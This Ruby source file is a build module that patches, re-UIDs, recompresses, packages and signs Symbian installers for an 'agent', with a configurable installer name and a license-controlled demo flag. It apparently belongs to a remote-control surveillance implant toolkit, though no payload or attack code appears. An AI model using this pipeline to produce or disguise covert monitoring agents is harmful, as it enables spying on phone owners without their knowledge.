#
#  Agent creation for symbian
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/binary'

require 'yaml'
require 'find'

module RCS
module DB

class BuildSymbian < Build

  def initialize
    super
    @platform = 'symbian'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = '5th/SharedQueueMon_20023635.exe'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :symbian, params['demo']

    # invoke the generic patch method with the new params
    super

    params[:core] = '3rd/SharedQueueMon_20023635.exe'
    # invoke the generic patch method with the new params
    super

    params[:core] = 'symbian3/SharedQueueMon_20023635.exe'
    params[:config] = '2009093023'

    # invoke the generic patch method with the new params
    super

  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    @appname = params['appname'] || 'install'
  end

  def sign(params)
    trace :debug, "Build: signing: #{params}"

    raise "Cannot find UIDS file" unless File.exist? Config.instance.cert("symbian.uids")

    yaml = File.open(Config.instance.cert("symbian.uids"), 'rb') {|f| f.read}
    uids = YAML.load(yaml)

    # the UIDS must be 8 chars (padded with zeros)
    uids.collect! {|u| u.rjust(8, '0')}

    trace :debug, "Build: signing with UIDS #{uids.inspect}"

    # substitute the UIDS into every file
    Find.find(@tmpdir).each do |file|
      if File.file?(file)
        content = File.open(file, 'rb') {|f| f.read}
        content.binary_patch '[:UID1:]', uids[0] rescue nil
        content.binary_patch '[:UID2:]', uids[1] rescue nil
        content.binary_patch '[:UID3:]', uids[2] rescue nil
        content.binary_patch '[:UID4:]', uids[3] rescue nil
        content.binary_patch '[:UID5:]', uids[4] rescue nil
        content.binary_patch '[:UID6:]', uids[5] rescue nil
        content.gsub! /SharedQueueCli_20023633\{000a0000\}\[[a-z0-9]*\].dll/, "SharedQueueCli_20023633{000a0000}[#{uids[3]}].dll" rescue nil
        File.open(file, 'wb') {|f| f.write content}
      end
    end

    FileUtils.cp(path('symbian3/rsc'), path("symbian3/#{uids[0]}.rsc"))
    FileUtils.cp(path('5th/rsc'), path("5th/#{uids[0]}.rsc"))
    FileUtils.cp(path('3rd/rsc'), path("3rd/#{uids[0]}.rsc"))

    trace :debug, "Build: rebuilding with petran"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('symbian3/SharedQueueMon_20023635.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('5th/SharedQueueMon_20023635.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[1]} -sid 0x#{uids[1]} -compress #{path('3rd/SharedQueueMon_20023635.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('symbian3/SharedQueueSrv_20023634.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('5th/SharedQueueSrv_20023634.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[2]} -sid 0x#{uids[2]} -compress #{path('3rd/SharedQueueSrv_20023634.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('symbian3/SharedQueueCli_20023633.dll')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('5th/SharedQueueCli_20023633.dll')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[3]} -sid 0x#{uids[3]} -compress #{path('3rd/SharedQueueCli_20023633.dll')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('symbian3/Uninstaller.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('5th/Uninstaller.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[4]} -sid 0x#{uids[4]} -compress #{path('3rd/Uninstaller.exe')}"

    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('symbian3/UninstMonitor.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('5th/UninstMonitor.exe')}"
    CrossPlatform.exec path('petran'), "-uid3 0x#{uids[5]} -sid 0x#{uids[5]} -compress #{path('3rd/UninstMonitor.exe')}"

    trace :debug, "Build: creating sis files"

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('symbian3')}
    File.exist? path('symbian3/uninstaller.sis') or raise("makesis failed for uninstaller symbian3")

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sis') or raise("makesis failed for uninstaller 5th")

    CrossPlatform.exec path('makesis'), "uninstaller.pkg uninstaller.sis", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sis') or raise("makesis failed for uninstaller 3rd")

    trace :debug, "Build: creating sisx files"

    params['cert'] or raise "no cert provided"
    params['key'] or raise "no key provided"

    # this certificate are provided by the console
    FileUtils.mv(Config.instance.temp(params['cert']), path('symbian.cer'))
    FileUtils.mv(Config.instance.temp(params['key']), path('symbian.key'))

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('symbian3')}
    File.exist? path('symbian3/uninstaller.sisx') or raise("signsis failed for uninstaller symbian3")

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('5th')}
    File.exist? path('5th/uninstaller.sisx') or raise("signsis failed for uninstaller 5th")

    CrossPlatform.exec path('signsis'), "-s uninstaller.sis uninstaller.sisx ../symbian.cer ../symbian.key", {chdir: path('3rd')}
    File.exist? path('3rd/uninstaller.sisx') or raise("signsis failed for uninstaller 3rd")

    trace :debug, "Build: final installer #{params['edition']}"

    raise "invalid edition" if params['edition'].nil?
    
    CrossPlatform.exec path('makesis'), "installer-#{params['edition']}.pkg installer.sis", {chdir: path('')}
    File.exist? path('installer.sis') or raise("makesis failed for installer")

    CrossPlatform.exec path('signsis'), "-s installer.sis #{@appname}.sisx symbian.cer symbian.key", {chdir: path('')}
    File.exist? path(@appname + '.sisx') or raise("signsis failed for installer")

    @outputs += ['installer.sis', @appname + '.sisx']
    
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
      z.file.open(@appname + '.sisx', "wb") { |f| f.write File.open(path(@appname + '.sisx'), 'rb') {|f| f.read} }
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end


end

end #DB::
end #RCS::
